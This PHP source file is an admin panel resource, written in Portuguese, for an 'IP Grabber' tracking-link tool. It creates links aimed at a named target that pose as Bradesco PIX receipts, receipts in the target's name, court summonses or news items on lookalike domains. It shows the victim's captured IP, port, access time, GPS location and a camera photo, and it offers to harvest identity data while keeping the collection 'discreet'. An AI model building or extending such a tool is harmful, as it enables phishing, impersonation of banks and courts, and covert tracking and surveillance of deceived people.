<?php

namespace App\Filament\Resources\PixelTracks;

use App\Filament\Resources\PixelTracks\Pages\CreateIpGrabber;
use App\Filament\Resources\PixelTracks\Pages\ListIpGrabbers;
use App\Filament\Resources\PixelTracks\Pages\ViewIpGrabber;
use App\Models\IpGrabber;
use App\Models\IpGrabberFoto;
use Filament\Actions;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\HtmlString;
use Illuminate\Support\Js;
use Filament\Forms;
use Filament\Notifications\Notification;
use Filament\Resources\Resource;
use Filament\Schemas\Components\Utilities\Get;
use Filament\Schemas\Components\Utilities\Set;
use Filament\Schemas\Schema;
use Filament\Tables;
use Filament\Tables\Table;
use Illuminate\Database\Eloquent\Builder;
use Illuminate\Database\Eloquent\Model;

class IpGrabberResource extends Resource
{
    protected static ?string $model = IpGrabber::class;

    protected static ?string $slug = 'ip-grabbers';

    public static function getNavigationIcon(): string|\BackedEnum|null
    {
        return 'heroicon-o-eye';
    }

    public static function getNavigationGroup(): string|\UnitEnum|null
    {
        return 'Rastreamento IP';
    }

    public static function getNavigationLabel(): string
    {
        return 'IP Grabber';
    }

    public static function getNavigationSort(): ?int
    {
        return 60;
    }

    public static function getNavigationBadge(): ?string
    {
        if (! (auth()->user()?->hasActivePixelSubscription() ?? false)) {
            return null;
        }

        $count = static::getEloquentQuery()->whereNull('clicked_at')->count();

        return $count > 0 ? (string) $count : null;
    }

    public static function getNavigationBadgeColor(): ?string
    {
        return 'warning';
    }

    public static function getModelLabel(): string
    {
        return 'IP Grabber';
    }

    public static function getPluralModelLabel(): string
    {
        return 'IP Grabber';
    }

    public static function getPages(): array
    {
        return [
            'index' => ListIpGrabbers::route('/'),
            'create' => CreateIpGrabber::route('/create'),
            'view' => ViewIpGrabber::route('/{record}'),
        ];
    }

    public static function getEloquentQuery(): Builder
    {
        return parent::getEloquentQuery()
            ->with(['criador'])
            ->withCount('fotos')
            ->where('created_by', auth()->id())
            ->where('tracking_channel', 'link')
            ->latest();
    }

    public static function canEdit(Model $record): bool
    {
        return false;
    }

    public static function form(Schema $schema): Schema
    {
        return $schema->components([
            \Filament\Schemas\Components\Section::make('Identificação')
                ->description('Descreva o alvo ou contexto de uso deste IP Grabber.')
                ->components([
                    Forms\Components\TextInput::make('label')
                        ->label('Rótulo / Identificação')
                        ->placeholder('Ex: Suspeito João - e-mail enviado em 07/05/2026')
                        ->required()
                        ->maxLength(255)
                        ->columnSpanFull(),

                    Forms\Components\Select::make('preview_tipo')
                        ->label('Tipo de link')
                        ->options([
                            'mensagem' => 'Mensagem Customizada',
                            'noticia' => 'Notícia externa',
                            'pix_bradesco' => 'PIX Bradesco (comprovante)',
                            'pix_nome_alvo' => 'Comprovante PIX em nome do alvo',
                            'intimacao' => 'Intimação',
                        ])
                        ->default('mensagem')
                        ->selectablePlaceholder(false)
                        ->live()
                        ->required()
                        ->columnSpanFull(),

                    Forms\Components\Select::make('tracking_domain')
                        ->label('Domínio do link')
                        ->options([
                            'comprovante-pix.site' => 'comprovante-pix.site',
                            'comprovante.online' => 'comprovante.online',
                            'intimacao.online' => 'intimacao.online',
                            'agenciadanoticia.online' => 'agenciadanoticia.online',
                        ])
                        ->default('comprovante-pix.site')
                        ->selectablePlaceholder(false)
                        ->required(fn (Get $get): bool => $get('preview_tipo') === 'mensagem')
                        ->visible(fn (Get $get): bool => $get('preview_tipo') === 'mensagem')
                        ->helperText('Escolha qual domínio será usado no link gerado para a mensagem do sistema.')
                        ->columnSpanFull(),

                    Forms\Components\Select::make('mensagem')
                        ->label('Mensagem exibida ao clicar')
                        ->options([
                            IpGrabber::DEFAULT_CLICK_MESSAGE => IpGrabber::DEFAULT_CLICK_MESSAGE,
                            'Sistema fora do ar' => 'Sistema fora do ar',
                            'PIX Estornado' => 'PIX Estornado',
                            'Redirecionar para página' => 'Redirecionar para página',
                        ])
                        ->default(IpGrabber::DEFAULT_CLICK_MESSAGE)
                        ->selectablePlaceholder(false)
                        ->live()
                        ->required()
                        ->visible(fn (Get $get): bool => ! in_array($get('preview_tipo'), ['noticia', 'intimacao'], true))
                        ->columnSpanFull(),

                    Forms\Components\FileUpload::make('intimacao_arquivo')
                        ->label('Arquivo da intimação')
                        ->helperText('PDF ou documento a ser entregue ao alvo após a captura.')
                        ->disk('public')
                        ->directory('intimacoes')
                        ->visibility('public')
                        ->acceptedFileTypes(['application/pdf', 'image/jpeg', 'image/png'])
                        ->maxSize(10240)
                        ->required(fn (Get $get): bool => $get('preview_tipo') === 'intimacao')
                        ->visible(fn (Get $get): bool => $get('preview_tipo') === 'intimacao')
                        ->columnSpanFull(),

                    Forms\Components\TextInput::make('redirect_url')
                        ->label('URL de redirecionamento')
                        ->placeholder('https://site.com/pagina')
                        ->url()
                        ->maxLength(255)
                        ->required(fn (Get $get): bool => $get('mensagem') === 'Redirecionar para página' && ! in_array($get('preview_tipo'), ['noticia', 'intimacao'], true))
                        ->visible(fn (Get $get): bool => $get('mensagem') === 'Redirecionar para página' && ! in_array($get('preview_tipo'), ['noticia', 'intimacao'], true))
                        ->helperText('Após registrar o acesso, o navegador será direcionado para esta URL.')
                        ->columnSpanFull(),

                    Forms\Components\TextInput::make('noticia_url')
                        ->label('Link da notícia')
                        ->placeholder('https://site.com/noticia...')
                        ->url()
                        ->maxLength(255)
                        ->required(fn (Get $get): bool => $get('preview_tipo') === 'noticia')
                        ->visible(fn (Get $get): bool => $get('preview_tipo') === 'noticia')
                        ->helperText('O sistema usará título, descrição e imagem da notícia no preview. Ao clicar, o alvo será encaminhado para esta URL.')
                        ->columnSpanFull(),

                    Forms\Components\TextInput::make('nome_alvo')
                        ->label('Nome do alvo')
                        ->placeholder('Ex: João da Silva')
                        ->maxLength(60)
                        ->required(fn (Get $get): bool => $get('preview_tipo') === 'pix_nome_alvo')
                        ->visible(fn (Get $get): bool => $get('preview_tipo') === 'pix_nome_alvo')
                        ->helperText('Nome que será escrito automaticamente no comprovante PIX com a data e hora atuais.')
                        ->columnSpanFull(),

                    Forms\Components\Toggle::make('capture_gps')
                        ->label('Solicitar GPS do alvo')
                        ->default(false)
                        ->helperText('Depende de autorização explícita do alvo no navegador. Pode comprometer a discrição da coleta.')
                        ->columnSpanFull(),

                    Forms\Components\Toggle::make('capture_alvo')
                        ->label('Capturar foto do alvo')
                        ->default(false)
                        ->helperText('Depende de autorização explícita do alvo no navegador. Pode comprometer a discrição da coleta.')
                        ->columnSpanFull(),

                    Forms\Components\Toggle::make('capture_identity')
                        ->label('Tentar coletar identidade digital')
                        ->default(false)
                        ->helperText('Opcional. Nome, e-mail, telefone/autofill e contas/apps detectáveis dependem de autorização, permissões e comportamento do navegador do alvo; em muitos navegadores esses dados podem não ser disponibilizados.')
                        ->columnSpanFull(),
                ]),

            \Filament\Schemas\Components\Section::make('Preview no WhatsApp / Telegram')
                ->description('O que aparece quando o link é colado antes de ser clicado.')
                ->collapsed()
                ->visible(fn (Get $get): bool => in_array($get('preview_tipo'), ['mensagem', 'pix_nome_alvo'], true))
                ->components([
                    Forms\Components\TextInput::make('og_titulo')
                        ->label('Título do preview')
                        ->placeholder('Ex: Documento Policial - Delegacia de Confresa')
                        ->maxLength(255)
                        ->columnSpanFull(),

                    Forms\Components\TextInput::make('og_descricao')
                        ->label('Descrição do preview')
                        ->placeholder('Ex: Clique para visualizar o documento.')
                        ->maxLength(255)
                        ->columnSpanFull(),

                    Forms\Components\Toggle::make('preview_usar_upload')
                        ->label('Usar upload de imagem')
                        ->default(true)
                        ->live()
                        ->afterStateUpdated(function (Set $set, ?bool $state): void {
                            if (! $state) {
                                return;
                            }

                            $set('preview_usar_url', false);
                        })
                        ->helperText('A imagem enviada no upload será usada no preview.')
                        ->columnSpanFull(),

                    Forms\Components\Toggle::make('preview_usar_url')
                        ->label('Usar URL da imagem')
                        ->default(false)
                        ->live()
                        ->afterStateUpdated(function (Set $set, ?bool $state): void {
                            if (! $state) {
                                return;
                            }

                            $set('preview_usar_upload', false);
                        })
                        ->helperText('A URL informada será usada como imagem do preview.')
                        ->columnSpanFull(),

                    Forms\Components\FileUpload::make('og_imagem_upload')
                        ->label('Upload de imagem do preview')
                        ->helperText('JPEG ou PNG. Usado quando o modo de upload está habilitado.')
                        ->image()
                        ->disk('public')
                        ->directory('pixel-og')
                        ->visibility('public')
                        ->imagePreviewHeight('120')
                        ->maxSize(4096)
                        ->acceptedFileTypes(['image/jpeg', 'image/png'])
                        ->required(fn (Get $get): bool => (bool) $get('preview_usar_upload'))
                        ->visible(fn (Get $get): bool => (bool) $get('preview_usar_upload'))
                        ->columnSpanFull(),

                    Forms\Components\TextInput::make('og_imagem')
                        ->label('URL da imagem do preview')
                        ->placeholder('https://seudominio.com/imagens/preview.jpg')
                        ->url()
                        ->required(fn (Get $get): bool => (bool) $get('preview_usar_url'))
                        ->visible(fn (Get $get): bool => (bool) $get('preview_usar_url'))
                        ->helperText('Tamanho ideal: 1200x630px.')
                        ->columnSpanFull(),

                ]),
        ]);
    }

    public static function table(Table $table): Table
    {
        return $table
            ->recordUrl(null)
            ->columns([
                Tables\Columns\TextColumn::make('label')
                    ->label('Identificação')
                    ->searchable()
                    ->sortable()
                    ->wrap()
                    ->weight('bold'),
                Tables\Columns\TextColumn::make('pixel_url')
                    ->label('URL do link')
                    ->state(fn (IpGrabber $record) => $record->trackingUrl())
                    ->copyable()
                    ->copyMessage('URL copiada!')
                    ->copyableState(fn (IpGrabber $record) => $record->trackingUrl())
                    ->wrap(),
                Tables\Columns\TextColumn::make('status')
                    ->label('Status')
                    ->badge()
                    ->state(fn (IpGrabber $record) => $record->clicked_at ? 'Capturado' : 'Aguardando')
                    ->color(fn (IpGrabber $record) => $record->clicked_at ? 'success' : 'warning'),
                Tables\Columns\TextColumn::make('total_acessos')
                    ->label('Acessos')
                    ->alignCenter()
                    ->sortable(),
                Tables\Columns\TextColumn::make('ip')->label('IP Público')->copyable()->searchable()->placeholder('—'),
                Tables\Columns\TextColumn::make('porta')->label('Porta')->alignCenter()->placeholder('—'),
                Tables\Columns\TextColumn::make('gmt')
                    ->label('GMT')
                    ->formatStateUsing(fn (?string $state): string => $state ? trim(explode(' ', $state)[0]) : '—')
                    ->placeholder('—'),
                Tables\Columns\TextColumn::make('clicked_at')
                    ->label('Hora do Acesso')
                    ->dateTime('d/m/Y H:i:s')
                    ->timezone('America/Sao_Paulo')
                    ->placeholder('—')
                    ->sortable(),
                Tables\Columns\TextColumn::make('created_at')
                    ->label('Criado em')
                    ->dateTime('d/m/Y H:i')
                    ->timezone('America/Sao_Paulo')
                    ->sortable()
                    ->toggleable(isToggledHiddenByDefault: true),
            ])
            ->filters([
                Tables\Filters\SelectFilter::make('status')
                    ->label('Status')
                    ->options(['capturado' => 'Capturado', 'aguardando' => 'Aguardando'])
                    ->query(fn (Builder $query, array $data) => match ($data['value'] ?? null) {
                        'capturado' => $query->whereNotNull('clicked_at'),
                        'aguardando' => $query->whereNull('clicked_at'),
                        default => $query,
                    }),
                Tables\Filters\Filter::make('ip')
                    ->label('IP')
                    ->form([Forms\Components\TextInput::make('ip')->placeholder('ex: 200.100.50.10')])
                    ->query(fn (Builder $query, array $data) => ($value = trim((string) ($data['ip'] ?? ''))) === '' ? $query : $query->where('ip', 'like', "%{$value}%")),
                Tables\Filters\Filter::make('label')
                    ->label('Identificação')
                    ->form([Forms\Components\TextInput::make('label')->placeholder('Buscar por rótulo...')])
                    ->query(fn (Builder $query, array $data) => ($value = trim((string) ($data['label'] ?? ''))) === '' ? $query : $query->where('label', 'like', "%{$value}%")),
            ])
            ->recordActions([
                Actions\ViewAction::make()->label('Histórico')->icon('heroicon-o-clock'),
                Actions\Action::make('copiar_url')
                    ->label('Copiar URL')
                    ->icon('heroicon-o-clipboard-document')
                    ->color('gray')
                    ->extraAttributes(function (IpGrabber $record): array {
                        $url = Js::from($record->trackingUrl());

                        return [
                            'x-on:click' => <<<JS
                                const text = {$url};
                                const fallbackCopy = () => {
                                    const textarea = document.createElement('textarea');
                                    textarea.value = text;
                                    textarea.setAttribute('readonly', '');
                                    textarea.style.position = 'fixed';
                                    textarea.style.top = '0';
                                    textarea.style.left = '0';
                                    textarea.style.opacity = '0';
                                    document.body.appendChild(textarea);
                                    textarea.focus();
                                    textarea.select();
                                    textarea.setSelectionRange(0, textarea.value.length);

                                    try {
                                        document.execCommand('copy');
                                    } finally {
                                        document.body.removeChild(textarea);
                                    }
                                };

                                if (navigator.clipboard && window.isSecureContext) {
                                    navigator.clipboard.writeText(text).catch(fallbackCopy);
                                } else {
                                    fallbackCopy();
                                }
                            JS,
                        ];
                    })
                    ->action(function (): void {
                        Notification::make()
                            ->title('URL copiada')
                            ->success()
                            ->send();
                    }),
                Actions\Action::make('ver_mapa_gps')
                    ->label('GPS')
                    ->icon('heroicon-o-map-pin')
                    ->color('info')
                    ->visible(fn (IpGrabber $record) => $record->gps_latitude !== null)
                    ->url(fn (IpGrabber $record) => "https://www.google.com/maps?q={$record->gps_latitude},{$record->gps_longitude}")
                    ->openUrlInNewTab(),

                Actions\Action::make('ver_foto')
                    ->label('Foto')
                    ->icon('heroicon-o-camera')
                    ->color('success')
                    ->visible(fn (IpGrabber $record) => ($record->fotos_count ?? 0) > 0)
                    ->modalHeading('Foto capturada do alvo')
                    ->modalContent(function (IpGrabber $record): HtmlString {
                        /** @var IpGrabberFoto|null $foto */
                        $foto = $record->fotos()->first();

                        if (! $foto) {
                            return new HtmlString(
                                '<div class="flex flex-col items-center gap-2 py-8 text-gray-400">'
                                . '<svg xmlns="http://www.w3.org/2000/svg" class="w-12 h-12 opacity-30" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M6.827 6.175A2.31 2.31 0 0 1 5.186 7.23c-.38.054-.757.112-1.134.175C2.999 7.58 2.25 8.507 2.25 9.574V18a2.25 2.25 0 0 0 2.25 2.25h15A2.25 2.25 0 0 0 21.75 18V9.574c0-1.067-.75-1.994-1.802-2.169a47.865 47.865 0 0 0-1.134-.175 2.31 2.31 0 0 1-1.64-1.055l-.822-1.316a2.192 2.192 0 0 0-1.736-1.039 48.774 48.774 0 0 0-5.232 0 2.192 2.192 0 0 0-1.736 1.039l-.821 1.316Z"/><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M16.5 12.75a4.5 4.5 0 1 1-9 0 4.5 4.5 0 0 1 9 0ZM18.75 10.5h.008v.008h-.008V10.5Z"/></svg>'
                                . '<p class="text-sm">Nenhuma foto capturada ainda.</p>'
                                . '</div>'
                            );
                        }

                        $url   = e(Storage::disk('public')->url($foto->path));
                        $total = $record->fotos()->count();
                        $info  = $foto->created_at
                            ? $foto->created_at->timezone('America/Sao_Paulo')->format('d/m/Y H:i:s')
                            : '—';

                        return new HtmlString(<<<HTML
                            <div class="flex flex-col items-center gap-3 py-2">
                                <img
                                    src="{$url}"
                                    alt="Foto capturada"
                                    style="max-width:100%;max-height:65vh;border-radius:10px;box-shadow:0 4px 20px rgba(0,0,0,.18);"
                                >
                                <p class="text-xs text-gray-400">Capturada em {$info} &middot; {$total} foto(s) no total</p>
                                <a
                                    href="{$url}"
                                    target="_blank"
                                    rel="noopener"
                                    class="text-xs text-primary-600 hover:underline"
                                >Abrir em tamanho original ↗</a>
                            </div>
                        HTML);
                    })
                    ->modalSubmitAction(false)
                    ->modalCancelActionLabel('Fechar'),

                Actions\DeleteAction::make()->label('Excluir'),
            ])
            ->emptyStateHeading('Nenhum link criado')
            ->emptyStateDescription('Crie um IP Grabber para gerar um link invisível.')
            ->emptyStateIcon('heroicon-o-eye-slash');
    }
}
